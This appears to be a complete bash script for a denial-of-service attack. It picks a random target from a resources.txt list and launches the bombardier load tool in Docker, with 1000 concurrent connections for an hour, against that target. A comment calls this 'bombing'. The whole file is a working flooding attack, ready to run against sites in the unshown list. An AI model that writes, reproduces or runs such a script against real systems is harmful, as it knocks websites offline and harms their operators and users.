#!/bin/bash

# get random resource
RESOURCE=`sort -R resources.txt | head -n1`

# start bombing
docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l $RESOURCE
